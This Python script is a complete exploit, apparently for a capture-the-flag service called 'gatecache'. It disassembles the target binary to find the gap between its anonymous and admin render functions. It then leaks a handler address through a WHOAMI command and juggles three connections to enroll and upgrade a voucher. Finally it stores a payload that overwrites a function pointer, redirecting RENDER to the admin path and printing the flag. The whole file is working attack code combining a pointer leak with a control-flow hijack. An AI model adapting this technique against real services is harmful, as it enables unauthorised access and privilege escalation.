import socket
import struct
import sys
import time

from elftools.elf.elffile import ELFFile
from elftools.dwarf.callframe import FDE
from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_OP_MEM, x86

RENDER_OFFSET = 48


def function_ranges(elf):
    dwarf = elf.get_dwarf_info()
    ranges = []
    for entry in dwarf.EH_CFI_entries():
        if isinstance(entry, FDE):
            start = entry["initial_location"]
            ranges.append((start, start + entry["address_range"]))
    return sorted(ranges)


def static_render_delta(binary_path):
    with open(binary_path, "rb") as fh:
        elf = ELFFile(fh)
        text = elf.get_section_by_name(".text")
        text_vaddr = text["sh_addr"]
        text_data = text.data()

        needles = {"admin": b"view: admin principal", "anon": b"view: principal is anonymous"}
        str_vaddr = {}
        for section in elf.iter_sections():
            if section["sh_type"] == "SHT_NOBITS" or section["sh_addr"] == 0:
                continue
            data = section.data()
            base = section["sh_addr"]
            for name, needle in needles.items():
                idx = data.find(needle)
                if idx >= 0:
                    str_vaddr[name] = base + idx

        ranges = function_ranges(elf)

        def containing(addr):
            for start, end in ranges:
                if start <= addr < end:
                    return start
            return None

        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = True
        ref = {}
        for insn in md.disasm(text_data, text_vaddr):
            for op in insn.operands:
                if op.type == CS_OP_MEM and op.mem.base == x86.X86_REG_RIP:
                    target = insn.address + insn.size + op.mem.disp
                    for name, va in str_vaddr.items():
                        if target == va:
                            ref.setdefault(name, insn.address)

        anon_start = containing(ref["anon"])
        admin_start = containing(ref["admin"])
        return admin_start - anon_start


class Client:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=8)
        self.buf = b""

    def read_line(self):
        while b"\n" not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            self.buf += chunk
        line, _, rest = self.buf.partition(b"\n")
        self.buf = rest
        return line.decode(errors="replace")

    def send(self, text):
        self.sock.sendall(text.encode() + b"\n")

    def banner(self):
        self.read_line()
        self.read_line()


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9006
    binary = sys.argv[3] if len(sys.argv) > 3 else "gatecache"

    delta = static_render_delta(binary)
    print("[*] static admin/anon render delta = 0x%x" % delta)

    key = "1122334455667788"

    a = Client(host, port)
    a.banner()
    a.send("RESOLVE " + key)
    print("[A] " + a.read_line())

    a.send("WHOAMI")
    who = a.read_line()
    print("[A] " + who)
    handler = int(who.split("handler=")[1].split(" ")[0], 16)
    admin_addr = handler + delta
    print("[*] anon_render leak = 0x%x -> admin_render = 0x%x" % (handler, admin_addr))

    b = Client(host, port)
    b.banner()
    b.send("ENROLL " + key)
    voucher = b.read_line().split(" ", 1)[1]
    print("[B] voucher acquired")
    b.send("UPGRADE " + voucher)
    print("[B] " + b.read_line())

    c = Client(host, port)
    c.banner()
    payload = b"\x00" * RENDER_OFFSET + struct.pack("<Q", admin_addr)
    c.send("STORE " + payload.hex())
    print("[C] " + c.read_line())

    a.send("RENDER")
    time.sleep(0.1)
    while True:
        line = a.read_line()
        if not line:
            break
        print("[A] " + line)
        if "H7CTF{" in line:
            print("\n[+] FLAG: " + line.strip())
            return 0
    print("[-] no flag recovered")
    return 1


if __name__ == "__main__":
    sys.exit(main())
